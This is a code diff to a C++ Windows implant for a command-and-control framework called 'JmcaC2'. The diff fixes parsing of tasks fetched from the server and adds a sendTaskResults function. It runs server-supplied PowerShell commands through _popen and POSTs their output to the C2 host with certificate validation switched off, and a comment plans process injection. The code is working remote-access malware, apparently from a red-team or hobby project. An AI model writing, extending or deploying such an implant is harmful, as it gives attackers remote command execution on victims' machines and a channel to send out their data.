@@ -12,23 +12,24 @@ using std::string;
 const wchar_t* ACCEPTED_MIME_TYPES[] = {
     L"text/plain", L"application/octet-stream", L"text/html", NULL};
 
-void runPSCommand(string command);
+string runPSCommand(string command);
 int CreateTCPConn();
 bool sendHTTPTaskResult();
+bool sendTaskResults(const std::string& data);
 
 static std::wstring beaconName = L"";
 
-bool runTask(std::string outBuffer, DWORD dwSize) {
+bool runTask(string outBuffer, DWORD dwSize) {
     printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
 
     size_t pipePos = outBuffer.find('|');
 
-    if (!pipePos) return false;
+    if (pipePos == string::npos) return false;
 
-    std::string cmd = outBuffer.substr(0, pipePos);
+    string cmd = outBuffer.substr(0, pipePos);
 
-    if (cmd == "powershell")
-        runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
+    if (cmd == "powershell") runPSCommand(outBuffer.substr(pipePos + 1));
+
     return true;
 }
 
@@ -129,15 +130,16 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
 
         // append chunk to output
         char* newBuf = new char[*dwSizeOut + dwOut];
+
         if (*outBuffer != nullptr) {
             memcpy(newBuf, *outBuffer, *dwSizeOut);
             delete[] (*outBuffer);
         }
+
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
 
         *outBuffer = newBuf;
-        *dwSizeOut = dwOut;
-
+        *dwSizeOut += dwOut;
         delete[] responseBuf;
     }
 
@@ -148,14 +150,83 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     return didReceiveResponse;
 }
 
-void runPSCommand(std::string command) {
-    string powershellPrefix{"powershell -c "};
-    system((powershellPrefix + command).c_str());
+bool sendTaskResults(const std::string& data) {
+    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
+    bool isRequestSuccessful{}, didReceiveResponse{};
+
+    if (!(hHTTPSession = WinHttpOpen(
+              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
+                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPRequest = WinHttpOpenRequest(
+              hHTTPConnection, L"POST", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
+              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
+        return PrintWinHttpError("WinHttpOpenRequest");
+
+    std::cout << "Request Sent" << std::endl;
+
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
+                          sizeof(flags)))
+        return PrintWinHttpError("WinHttpSetOption");
+
+    std::wstring headers = L"Content-Type: application/octet-stream\r\n";
+
+    if (!beaconName.empty()) {
+        headers += L"BeaconName: " + beaconName + L"\r\n";
+    }
+
+    // should be replaced if POST
+    if (!(isRequestSuccessful = WinHttpSendRequest(
+              hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)data.data(),
+              (DWORD)data.size(), (DWORD)data.size(), 0)))
+        return PrintWinHttpError("WinHttpSendRequest");
+
+    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
+        return PrintWinHttpError("WinHttpReceiveResponse");
+
+    DWORD dwSize = 0;
+
+    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+
+    return didReceiveResponse;
+}
+
+string runPSCommand(string command) {
+    char psBuffer[DEFAULT_PS_BUFLEN];
+    string res;
+
+    string powershellCommand =
+        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";
+
+    FILE* pPipe = _popen(powershellCommand.c_str(), "rt");
+
+    if (!pPipe) return "ERROR";
+
+    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe)) {
+        res += psBuffer;
+        puts(psBuffer);  // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
+                         // WHEN I COUT << RESULT
+    }
+
+    int exitCode = _pclose(pPipe);
+
+    sendTaskResults(res);
+
+    return res;
 
     // TODO: Make this process injection?
 }
-
-void fetchServerCertificate(HINTERNET hConnection) {}
 
 int main(int argc, const char** argv) {
     // Run all checks
